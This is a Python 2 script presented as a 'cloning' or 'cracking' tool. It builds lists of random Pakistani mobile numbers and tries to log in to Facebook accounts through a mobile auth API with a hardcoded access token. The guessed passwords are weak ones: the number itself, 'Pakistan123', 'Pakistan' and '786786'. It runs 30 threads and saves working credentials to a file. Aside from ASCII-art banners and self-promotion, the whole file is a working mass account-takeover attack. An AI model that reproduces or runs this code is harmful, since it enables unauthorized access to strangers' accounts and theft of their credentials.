#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;92mPlease Wait.. \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;93m _____ _   _   _________ _____  _    _ 
\033[1;96m/  ___| | | | /   |  _  \  _  || |  | |
\033[1;97m\ `--.| |_| |/ /| | | | | | | || |  | |
\033[1;97m `--. \  _  / /_| | | | | | | || |/\| |
\033[1;96m/\__/ / | | \___  | |/ /\ \_/ /\  /\  /
\033[1;93m\____/\_| |_/   |_/___/  \___/  \/  \/ 
                                       

\033[1;91m  _______ _____  _____ _____ _  ________ _____  
\033[1;92m |__   __|  __ \|_   _/ ____| |/ /  ____|  __ \ 
\033[1;93m    | |  | |__) | | || |    | ' /| |__  | |__) |
\033[1;94m    | |  |  _  /  | || |    |  < |  __| |  _  / 
\033[1;95m    | |  | | \ \ _| || |____| . \| |____| | \ \ 
\033[1;97m    |_|  |_|  \_\_____\_____|_|\_\______|_|  \_\
                                                

\033[1;92m____________36936936936936936
\033[1;96m____________36936936936936936
\033[1;96m____________369369369369369369
\033[1;96m___________36936936936936933693
\033[1;96m__________3693693693693693693693
\033[1;95m_________369369369369369369369369
\033[1;95m_________3693693693693693693693699
\033[1;95m________3693693693693693693693699369
\033[1;95m_______36936939693693693693693693693693
\033[1;94m_____3693693693693693693693693693693636936
\033[1;94m___36936936936936936936936936936___369369369
\033[1;94m__36936___369336936369369369369________36936
\033[1;94m_36936___36936_369369336936936\033[1;91m__��__��
\033[1;97m36933___36936__36936___3693636\033[1;91m_��������
\033[1;97m693____36936__36936_____369363\033[1;91m_��������
\033[1;97m______36936__36936______369369\033[1;91m__������
\033[1;97m_____36936___36936_______36936\033[1;91m___����
\033[1;92m_____36936___36936________36936\033[1;91m___��
\033[1;92m_____36936___36936_________36936___11,
\033[1;92m______369____36936__________369___11,
\033[1;92m______________369________________11,
\033[1;95m_______________________________11,
\033[1;95m_____________________________11,
\033[1;95m___________________________11,
\033[1;95m________________________\033[1;91m���_���
\033[1;96m_______________________\033[1;91m���������
\033[1;96m_______________________\033[1;91m���������
\033[1;96m________________________\033[1;91m�������
\033[1;96m_________________________\033[1;91m�����
\033[1;94m__________________________\033[1;91m���
\033[1;94m___________________________\033[1;91m�
\033[1;94m______________________________11,
\033[1;94m________________________________11,
\033[1;92m__________________________________11,
\033[1;92m___________________________________11,
\033[1;92m___________________________________11,
\033[1;92m__________________________________11,
\033[1;97m_________________________________11,
\033[1;97m_______________________________11,
\033[1;97m___________________________\033[1;91m��__��
\033[1;97m__________________________\033[1;91m��������
\033[1;96m__________________________\033[1;91m��������
\033[1;96m___________________________\033[1;91m������
\033[1;96m____________________________ \033[1;91m���
\033[1;96m_____________________________ \033[1;91m�
\033[1;95m____________________________11,
\033[1;95m__________________________11,
\033[1;95m_________________________11,
\033[1;95m___________________________11,
\033[1;94m_____________________________11,
\033[1;94m________________________________11,
\033[1;94m__________________________________11,
\033[1;94m______________369___________________11,
\033[1;92m______369____36936__________369_____11,
\033[1;92m_____36936___36936_________36936___11,
\033[1;92m_____36936___36936________36936___11,
\033[1;92m_____36936___36936_______36936___11,
\033[1;97m______36936__36936______369369 _\033[1;91m��_��
\033[1;97m693____36936__36936_____369363 \033[1;91m�������
\033[1;97m36933___36936__36936___3693636 \033[1;91m�������
\033[1;97m_36936___36936_369369336936936 \033[1;91m_�����
\033[1;96m__36936___369336936369369369369 \033[1;91m_���\033[1;93m__3696
\033[1;96m___36936936936936936936936936936 \033[1;91m_�\033[1;93m_336939
\033[1;96m_____36936936936936936936936936936936936
\033[1;96m_______369369396936936936936936693693
\033[1;95m________36936936936936936936999369
\033[1;95m_________36936936936936936933699
\033[1;95m_________3693693693693693369369
\033[1;95m__________36936936936936993693
\033[1;94m___________369369369369333693
\033[1;94m____________3693693693699369
\033[1;94m____________369369369366936
\033[1;94m____________36936936936693



\033[1;91m __     ______  _    _ _______ _    _ ____  ______ _____  
\033[1;91m \ \   / / __ \| |  | |__   __| |  | |  _ \|  ____|  __ \ 
\033[1;91m  \ \_/ / |  | | |  | |  | |  | |  | | |_) | |__  | |__) |
\033[1;91m   \   /| |  | | |  | |  | |  | |  | |  _ <|  __| |  _  / 
\033[1;91m    | | | |__| | |__| |  | |  | |__| | |_) | |____| | \ \ 
\033[1;91m    |_|  \____/ \____/   |_|   \____/|____/|______|_|  \_\


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
\033[1;93m---------------------MR-SH4DOW-404-----------------------

\033[1;95mAUTHOR      : \033[1;92mMR-SH4DOW-404✅🔥
\033[1;95mINSTAGRAM  : \033[1;93mIG_CLASHERXESPORTS✅🔥
\033[1;95mYOUTUBE     : \033[1;97mMR SHADOW TRICKS
\033[1;95mITS NOT A NAME ITS BRAND🔥  \033[1;92mMR-SH4DOW-404
\033[1;95mWITHOUT LOGIN UPDATED 10.1 TOOL✅🔥
\033[1;95mUSE FAST 4G INTERNET

\033[1;93m---------------------MR-SH4DOW-TRICKS-----------------------
"""
####Logo####

logo1 = """

\033[1;96m╭━━━┳╮╱╭┳━━━┳━━━┳━━━┳╮╭╮╭╮
\033[1;97m┃╭━╮┃┃╱┃┃╭━╮┣╮╭╮┃╭━╮┃┃┃┃┃┃
\033[1;95m┃╰━━┫╰━╯┃┃╱┃┃┃┃┃┃┃╱┃┃┃┃┃┃┃
\033[1;94m╰━━╮┃╭━╮┃╰━╯┃┃┃┃┃┃╱┃┃╰╯╰╯┃Updated 10.1
\033[1;93m┃╰━╯┃┃╱┃┃╭━╮┣╯╰╯┃╰━╯┣╮╭╮╭╯
\033[1;92m╰━━━┻╯╱╰┻╯╱╰┻━━━┻━━━╯╰╯╰╯

\033[1;93m---------------------MR-SH4DOW-404-----------------------

\033[1;92m\033[1;95mAUTHOR      : \033[1;92mMR-SH4DOW-404✅🔥
\033[1;92m\033[1;95mINSTAGRAM    : \033[1;93mIG_CLASHERXESPORTS✅🔥
\033[1;92m\033[1;95mYOUTUBE       : \033[1;97mMR SHADOW TRICKS
\033[1;92m\033[1;95mITS NOT A NAME ITS BRAND🔥  \033[1;92mMR-SH4DOW-404
\033[1;92m\033[1;95mWITHOUT LOGIN UPDATED 10.1 TOOL✅🔥
\033[1;92m\033[1;95mUSE FAST 4G INTERNET

\033[1;93m---------------------MR-SH4DOW-TRICKS-----------------------
"""
logo2 = """
\033[1;97m░░░░░░░░░░░░░░░▓██████▓▓▓░░░░░░░░░░░░░░░MR-SHADOW-TRICKS
\033[1;96m░░░░░░░░░░░░░█████▓▓█████████▓░░░░░░░░░░░
\033[1;95m░░░░░░░░░░█████▓░░▓█████████████░░░░░░░░░MR-SHADOW-TRICKS
\033[1;94m░░░░░░░░▓███▓░░░▓█████████████████░░░░░░░
\033[1;93m░░░░░░░███▓░░░░░███████████████████▓░░░░░MR-SHADOW-TRICKS
\033[1;92m░░░░░░███░░░░░░██████████████████████░░░░
\033[1;91m░░░░░███░░░░░░░███████████████████████░░░MR-SHADOW-TRICKS
\033[1;91m░░░░███░░░░░░░░███████░░░░██████████▓█▓░░
\033[1;92m░░░███▓░░░░░░░░███████░░░░▓██████████▓█░░MR-SHADOW-TRICKS
\033[1;93m░░▓███░░░░░░░░░░██████▓░░▓███████████▓██░
\033[1;94m░░████░░░░░░░░░░▓████████████████████▓▓█░MR-SHADOW-TRICKS
\033[1;95m░▓█░█▓░░░░░░░░░░░░████████████████████░██
\033[1;96m░██░█░░░░░░░░░░░░░░▓██████████████████░██MR-SHADOW-TRICKS
\033[1;97m░█▓░█░░░░░░░░░░░░░░░░░▓███████████████░▓█
\033[1;97m▓█▓░█▓░░░░░░░░░░░░░░░░░░██████████████░░█MR-SHADOW-TRICKS
\033[1;96m██░░██░░░░░░░░░░░▓▓░░░░░░▓████████████░░█
\033[1;95m██░▓░█░░░░░░░░░░████▓░░░░░███████████▓░░█MR-SHADOW-TRICKS
\033[1;94m██░█░██░░░░░░░░▓█████░░░░░░██████████░░▓█
\033[1;93m██░▓█░██░░░░░░░░████▓░░░░░░█████████░░▓▓█MR-SHADOW-TRICKS
\033[1;92m▓█░░█░░█▓░░░░░░░░▓▓░░░░░░░░████████▓░░▓██
\033[1;91m░█░░█▓░▓██░░░░░░░░░░░░░░░░░███████▓░░█▓█▓MR-SHADOW-TRICKS
\033[1;91m░██░███████▓░░░░░░░░░░░░░░██████████▓█▓█░
\033[1;92m░▓█░██▓░░░▓███░░░░░░░░░░▓██████▓░░░▓██▓█░MR-SHADOW-TRICKS
\033[1;93m░░███▓░░░░░░░███████████████▓░░░░░░░░██▓░
\033[1;94m░░░██░░▓▓█▓▓▓░░░▓████████▓░░░░▓▓█▓▓░░██░░MR-SHADOW-TRICKS
\033[1;95m░░░▓█░████████▓░░░░░░░░░░░░▓████████░▓█░░
\033[1;96m░░░█▓▓███████████░░░░░░░░████████████░█▓░MR-SHADOW-TRICKS
\033[1;97m░░░█░█████████████░░░░░░█████████████░██░
\033[1;97m░░▓█░▓████████████░░░░░░█████████████░░█░MR-SHADOW-TRICKS
\033[1;96m░░▓█░▓▓███████████░░░░░░███████████▓▓░░█░
\033[1;95m░░▓█░░░▓█████████░░░░░░░░█████████▓░░░░█░MR-SHADOW-TRICKS
\033[1;94m░░░█▓░░░████████░░░░░░░░░░████████░░░░██░
\033[1;93m░░░██░░░░░█████░░░░████░░░░█████▓░░░░░█▓░MR-SHADOW-TRICKS
\033[1;92m░░░░██░░░░░░░░░░░░██████░░░░░░░░░░▓░░██░░
\033[1;91m░░░░▓████▓░░░░░░░░███▓██▓░░░░░░░░█████░░░MR-SHADOW-TRICKS
\033[1;91m░░░░░▓█▓████▓░░░░░██░▓▓██░░░░▓████░██░░░░
\033[1;92m░░░░░░░░▓█▓██░▓░░░██▓▓▓██░░█▓█████░░░░░░░MR-SHADOW-TRICKS
\033[1;93m░░░░░░░░▓█░███▓░░░▓▓▓░▓░░░░░█▓██▓█░░░░░░░
\033[1;94m░░░░░░░░▓█░██▓░░▓░░░░░░░░░▓░███▓▓█░░░░░░░MR-SHADOW-TRICKS
\033[1;95m░░░░░░░░▓█░███▓███▓░░░░░▓███▓██░▓█░░░░░░░
\033[1;96m░░░░░░░░██░░██░▓░█████████░▓▓█▓░▓█░░░░░░░MR-SHADOW-TRICKS
\033[1;97m░░░░░░░░▓█░░▓██▓▓░░▓░█░█░▓░▓██░░░█░░░░░░░
\033[1;97m░░░░░░░░░█▓░░████░▓░░▓░░▓▓███░░░██░░░░░░░MR-SHADOW-TRICKS
\033[1;96m░░░░░░░░░▓█▓░░████████▓█████░░░██▓░░░░░░░
\033[1;95m░░░░░░░░░░░██░░▓▓▓▓▓▓▓▓▓▓▓█░░░██░░░░░░░░░MR-SHADOW-TRICKS
\033[1;94m░░░░░░░░░░░░██░░▓█████▓██▓░░▓██░░░░░░░░░░
\033[1;93m░░░░░░░░░░░░░██░░░░░▓▓░░░░░███░░░░░░░░░░░MR-SHADOW-TRICKS
\033[1;92m░░░░░░░░░░░░░░██░░░░░░░░░░██▓░░░░░░░░░░░░
\033[1;91m░░░░░░░░░░░░░░▓██░░░░░░░░██░░░░░░░░░░░░░░MR-SHADOW-TRICKS
\033[1;96m░░░░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░


\033[1;93m---------------------MR-SH4DOW-404-----------------------

\033[1;95mAUTHOR      : \033[1;92mMR-SH4DOW-404✅🔥
\033[1;95mINSTAGRAM  : \033[1;93mIG_CLASHERXESPORTS✅🔥
\033[1;95mYOUTUBE     : \033[1;97mMR SHADOW TRICKS
\033[1;95mITS NOT A NAME ITS BRAND🔥  \033[1;92mMR-SH4DOW-404
\033[1;95mWITHOUT LOGIN UPDATED 10.1 TOOL✅🔥
\033[1;95mUSE FAST 4G INTERNET

\033[1;93m---------------------MR-SH4DOW-TRICKS-----------------------
"""

CorrectPasscode = "SHADOW"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[] \x1b[1;97mPASSWORD \x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mCORRECT
                  """
            loop = 'false'
    else:
            print "\033[1;91mWRONG"
            os.system('xdg-open https://www.youtube.com/c/TechWithShadow')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1]\x1b[1;94m Start cloning ( Without login )"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;94m Exit ( ❌❌❌ )'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;95m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;94m[1] Start Fast Cracking'
    time.sleep(0.05)
    print '\x1b[1;94m[0] \033[1;93m Back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Pakistan Mobile code Number"+'\n'
        print 'Enter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;92m Total ids number: '+xxx)
    jalan ('\033[1;93mCode you Choose: '+c)
    jalan ("\033[1;92mWait A While Start Cracking......")
    jalan ("\033[1;93mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;91m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SHADOW-OK]  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;93m[SHADOW-CP] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[SHADOW-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m[SHADOW-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[SHADOW-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;93m[SHADOW-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="Pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[SHADOW-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;93m[SHADOW-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m[SHADOW-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;93m[SHADOW-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed......'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 7 to 8 days✅🔥🔥")
    print ''
    print """
    ───────────────────██
──────────────────█─██
──────────────────█───█
──────────────────█───█
──────────────────█───█
──────────────────█───█
──────────────────█───█▓
──────────────────█───▓█
──────────────────█───░█
──────────────────█───░█
──────────────────█░░░─█
───────────▓███──██▓▓███
───────────██──▓██▓────██
───────────█▓────█▓─────▓█
───────────█▓─────█──────░█
██████─────█▓─────█────────█
████████▓███░──────█──█▓────█
█░░░░░░█───────────█░███────█▓
▓██████─────────────█▓██────██
███████░────────────────────▓█
▓██████░────────────────────░█
▓██████░────────────────────▓█
▓██████░────────────────────█▓
▓██████░────────────────────█
▓██████░───────────────────██
▓███░██░──────────────────█
▓███──████████████████████
██████


\033[1;96mThanks me later👌🔥
\033[1;96m Instagram  ig_clasherxesports✅
\033[1;95mFb\033[1;97mSaleem Ahmad
\033[1;95myoutube\033[1;97mhttps://www.youtube.com/c/TechWithShadow"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()


